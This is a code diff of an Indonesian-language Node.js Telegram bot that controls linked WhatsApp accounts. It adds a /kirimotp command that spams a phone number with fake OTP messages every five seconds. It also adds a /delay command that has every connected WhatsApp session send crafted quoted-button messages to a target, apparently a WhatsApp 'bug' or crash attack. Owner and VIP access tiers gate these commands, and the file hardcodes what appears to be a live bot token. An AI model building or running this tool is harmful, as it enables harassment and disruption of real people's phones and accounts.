@@ -1,39 +1,242 @@
 const TelegramBot = require('node-telegram-bot-api');
 
-// Token bot Telegram kamu
+// Token Bot Telegram
 const token = '8161837253:AAHcyGQdM81yb_WEz57fVyxCi7JlknWNl-Q';
 const bot = new TelegramBot(token, { polling: true });
 
 const fakeOTP = () => Math.floor(100000 + Math.random() * 900000).toString();
-
-let spamInterval = {};
+const spamInterval = {};
 const cooldowns = new Map();
+const sessions = new Map(); // Placeholder bot WhatsApp
+const settings = { cooldown: 60 }; // Cooldown 60 detik
 
-// === PLACEHOLDER: SESUAIKAN ===
-const sessions = new Map();
-const settings = { cooldown: 60 }; // cooldown dalam detik
+// === LIST PENGGUNA ===
+const OWNER_ID = 8161837253; // Ganti dengan ID kamu
+const SUPER_VIP = [123456789, 987654321];
+const PREMIUM_USERS = [111222333, 444555666];
 
-function isPremium(userId) {
-  // Placeholder: Ubah sesuai logic
-  return false;
+// === VALIDATOR ROLE ===
+function isOwner(id) {
+  return id === OWNER_ID;
 }
-function isSupervip(userId) {
-  // Placeholder: Ubah sesuai logic
-  return false;
+function isSupervip(id) {
+  return SUPER_VIP.includes(id);
 }
-function isOwner(userId) {
-  // Placeholder: Ubah sesuai logic
-  return false;
-}
-async function connectToWhatsApp(botNumber, chatId) {
-  // Placeholder: implementasi koneksi WhatsApp
-  console.log(`Menghubungkan ke bot WhatsApp: ${botNumber}`);
+function isPremium(id) {
+  return PREMIUM_USERS.includes(id);
 }
 function dateTime() {
   return new Date().toLocaleString();
 }
+function saveActiveSessions(botNumber) {
+  try {
+    const sessions = [];
+    if (fs.existsSync(SESSIONS_FILE)) {
+      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
+      if (!existing.includes(botNumber)) {
+        sessions.push(...existing, botNumber);
+      }
+    } else {
+      sessions.push(botNumber);
+    }
+    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
+  } catch (error) {
+    console.error("Error saving session:", error);
+  }
+}
+//fungsi penginisialisasi
+async function initializeWhatsAppConnections() {
+  try {
+    if (fs.existsSync(SESSIONS_FILE)) {
+      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
+      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
 
-// ============ QUOTED FUNCTION ============
+      for (const botNumber of activeNumbers) {
+        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
+        const sessionDir = createSessionDir(botNumber);
+        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+
+        const sock = makeWASocket({
+          auth: state,
+          printQRInTerminal: true,
+          logger: P({ level: "silent" }),
+          defaultQueryTimeoutMs: undefined,
+        });
+
+        await new Promise((resolve, reject) => {
+          sock.ev.on("connection.update", async (update) => {
+            const { connection, lastDisconnect } = update;
+            if (connection === "open") {
+              console.log(`Bot ${botNumber} terhubung!`);
+              sessions.set(botNumber, sock);
+              resolve();
+            } else if (connection === "close") {
+              const shouldReconnect =
+                lastDisconnect?.error?.output?.statusCode !==
+                DisconnectReason.loggedOut;
+              if (shouldReconnect) {
+                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
+                await initializeWhatsAppConnections();
+              } else {
+                reject(new Error("Koneksi ditutup"));
+              }
+            }
+          });
+
+          sock.ev.on("creds.update", saveCreds);
+        });
+      }
+    }
+  } catch (error) {
+    console.error("Error initializing WhatsApp connections:", error);
+  }
+}
+//otomatis membuat file session
+function createSessionDir(botNumber) {
+  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
+  if (!fs.existsSync(deviceDir)) {
+    fs.mkdirSync(deviceDir, { recursive: true });
+  }
+  return deviceDir;
+}
+//function info koneksi message bot
+async function connectToWhatsApp(botNumber, chatId) {
+  let statusMessage = await bot
+    .sendMessage(
+      chatId,
+      `
+\`\`\`
+╭━━━⭓「 𝐒𝐓𝐀𝐑𝐓 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
+║  𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳
+┃  𝐁𝐎𝐓 : ${botNumber}
+╰━━━━━━━━━━━━━━━━━━⭓
+\`\`\`
+`,
+      { parse_mode: "Markdown" }
+    )
+    .then((msg) => msg.message_id);
+
+  const sessionDir = createSessionDir(botNumber);
+  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+
+  const sock = makeWASocket({
+    auth: state,
+    printQRInTerminal: false,
+    logger: P({ level: "silent" }),
+    defaultQueryTimeoutMs: undefined,
+  });
+
+  sock.ev.on("connection.update", async (update) => {
+    const { connection, lastDisconnect } = update;
+
+    if (connection === "close") {
+      const statusCode = lastDisconnect?.error?.output?.statusCode;
+      if (statusCode && statusCode >= 500 && statusCode < 600) {
+        await bot.editMessageText(
+          `
+\`\`\`
+╭━━━⭓「 𝐑𝐄 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
+║  𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳
+┃  𝐁𝐎𝐓 : ${botNumber}
+╰━━━━━━━━━━━━━━━━━━⭓
+\`\`\`
+`,
+          {
+            chat_id: chatId,
+            message_id: statusMessage,
+            parse_mode: "Markdown",
+          }
+        );
+        await connectToWhatsApp(botNumber, chatId);
+      } else {
+        await bot.editMessageText(
+          `
+        \`\`\`
+╭━━━⭓「 𝐋𝐎𝐒𝐓 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
+║  𝐒𝐓𝐀𝐓𝐔𝐒 : ❌
+┃  𝐁𝐎𝐓 : ${botNumber}
+╰━━━━━━━━━━━━━━━━━━⭓
+\`\`\`
+`,
+          {
+            chat_id: chatId,
+            message_id: statusMessage,
+            parse_mode: "Markdown",
+          }
+        );
+        try {
+          fs.rmSync(sessionDir, { recursive: true, force: true });
+        } catch (error) {
+          console.error("Error deleting session:", error);
+        }
+      }
+    } else if (connection === "open") {
+      sessions.set(botNumber, sock);
+      saveActiveSessions(botNumber);
+      await bot.editMessageText(
+        `
+        \`\`\`
+╭━━━⭓「 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ° 」
+║  𝐒𝐓𝐀𝐓𝐔𝐒 : ✅
+┃  𝐁𝐎𝐓 : ${botNumber}
+╰━━━━━━━━━━━━━━━━━━⭓
+\`\`\`
+`,
+        {
+          chat_id: chatId,
+          message_id: statusMessage,
+          parse_mode: "Markdown",
+        }
+      );
+    } else if (connection === "connecting") {
+      await new Promise((resolve) => setTimeout(resolve, 1000));
+      try {
+        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
+          const code = await sock.requestPairingCode(botNumber);
+          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
+          await bot.editMessageText(
+            `
+            \`\`\`
+╭━━━⭓「 𝐏𝐀𝐢𝐑𝐢𝐍𝐆  ☇ 𝐂𝐨𝐃𝐄 ° 」
+║  𝐂𝐎𝐃𝐄 : ${formattedCode}
+┃  𝐁𝐎𝐓 : ${botNumber}
+╰━━━━━━━━━━━━━━━━━━⭓
+\`\`\`
+`,
+            {
+              chat_id: chatId,
+              message_id: statusMessage,
+              parse_mode: "Markdown",
+            }
+          );
+        }
+      } catch (error) {
+        console.error("Error requesting pairing code:", error);
+        await bot.editMessageText(
+          `
+          \`\`\`
+╭━━━⭓「 𝐏𝐀𝐢𝐑𝐢𝐍𝐆 ☇ 𝐄𝐑𝐑𝐨𝐑 ° 」
+║  𝐑𝐄𝐀𝐒𝐨𝐍 : ${error.message}
+┃  𝐁𝐎𝐓 : ${botNumber}
+╰━━━━━━━━━━━━━━━━━━⭓
+\`\`\`
+`,
+          {
+            chat_id: chatId,
+            message_id: statusMessage,
+            parse_mode: "Markdown",
+          }
+        );
+      }
+    }
+  });
+
+  sock.ev.on("creds.update", saveCreds);
+
+  return sock;
+}
+
+// === FUNCTION QUOTED ===
 async function quoted(bot, peler, msg = {}, buffer = null) {
   try {
     const buttons = [
@@ -66,7 +269,7 @@ async function quoted(bot, peler, msg = {}, buffer = null) {
   }
 }
 
-// ============ COMMAND /start ============
+// === /start ===
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, `Selamat datang ${msg.from.first_name}!\n\nGunakan perintah:\n/kirimotp <nomor> untuk mengirim OTP terus menerus.`, {
     reply_markup: {
@@ -78,7 +281,7 @@ bot.onText(/\/start/, (msg) => {
   });
 });
 
-// ============ COMMAND /kirimotp ============
+// === /kirimotp ===
 bot.onText(/\/kirimotp (.+)/, (msg, match) => {
   const chatId = msg.chat.id;
   const nomor = match[1];
@@ -102,16 +305,25 @@ bot.onText(/\/kirimotp (.+)/, (msg, match) => {
   }, 5000); // setiap 5 detik
 });
 
-// ============ COMMAND /addbot ============
+// === /addbot ===
+
 bot.onText(/\/addbot(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
 
+  // Akses hanya untuk OWNER & SVIP
   if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
-    return bot.sendMessage(chatId, "❗*LU SIAPA GOBLOK?!* Hanya OWNER & SVIP yang bisa tambah bot.", { parse_mode: "Markdown" });
+    return bot.sendMessage(
+      chatId,
+      "❗*LU SIAPA GOBLOK?!* Hanya OWNER & SVIP yang bisa tambah bot.",
+      { parse_mode: "Markdown" }
+    );
   }
 
+  // Validasi input
   if (!match || !match[1]) {
-    return bot.sendMessage(chatId, "❗️Contoh penggunaan:\n`/addbot 62xxxxxxxxxx`", { parse_mode: "Markdown" });
+    return bot.sendMessage(chatId, "❗️Contoh penggunaan:\n`/addbot 62xxxxxxxxxx`", {
+      parse_mode: "Markdown",
+    });
   }
 
   const botNumber = match[1].replace(/[^0-9]/g, "");
@@ -124,11 +336,14 @@ bot.onText(/\/addbot(?:\s+(.+))?/, async (msg, match) => {
     await connectToWhatsApp(botNumber, chatId);
   } catch (error) {
     console.error("Error in /addbot:", error);
-    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
+    bot.sendMessage(
+      chatId,
+      "⚠️ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
+    );
   }
 });
 
-// ============ COMMAND /delay ============
+// === /delay ===
 bot.onText(/\/delay(?:\s+(\d+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
@@ -180,16 +395,11 @@ bot.onText(/\/delay(?:\s+(\d+))?/, async (msg, match) => {
       }
     });
 
-    let successCount = 0;
-    let failCount = 0;
-
     for (const [botNum, sock] of sessions.entries()) {
       try {
-        await quoted(sock, jid, msg, null); // fix: tambahkan semua parameter
-        successCount++;
+        await quoted(sock, jid, msg, null);
       } catch (err) {
         console.error(`Error in bot ${botNum}:`, err.message);
-        failCount++;
       }
     }
 
@@ -199,7 +409,7 @@ bot.onText(/\/delay(?:\s+(\d+))?/, async (msg, match) => {
   }
 });
 
-// ============ CALLBACK BUTTON ============
+// === CALLBACK HANDLER ===
 bot.on("callback_query", (callbackQuery) => {
   const msg = callbackQuery.message;
   const chatId = msg.chat.id;
@@ -225,7 +435,7 @@ bot.on("callback_query", (callbackQuery) => {
   }
 });
 
-// ============ GLOBAL ERROR HANDLER ============
-process.on("unhandledRejection", (reason, promise) => {
-  console.error("Unhandled Rejection:", reason);
+// === ERROR GLOBAL HANDLER ===
+process.on("unhandledRejection", (reason) => {
+  console.error("Unhandled Promise Rejection:", reason);
 });
